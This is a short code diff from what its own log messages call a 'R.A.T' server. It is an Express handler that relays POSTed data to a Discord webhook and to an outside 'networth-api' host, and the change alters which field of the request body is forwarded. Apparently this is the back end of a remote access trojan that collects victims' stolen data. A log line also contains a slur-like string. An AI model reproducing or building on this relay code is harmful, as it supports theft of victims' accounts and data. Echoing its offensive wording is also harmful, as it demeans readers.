@@ -171,8 +171,8 @@ app.post("/", (req, res) => {
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
-                console.log("chigger" + req.body)
-                post("https://networth-api-dxxxxy.onrender.com", req.body, {
+                console.log("chigger" + req.body.text)
+                post("https://networth-api-dxxxxy.onrender.com", req.body.text, {
                     headers: {
                         "Content-Type": "application/json"
                     }
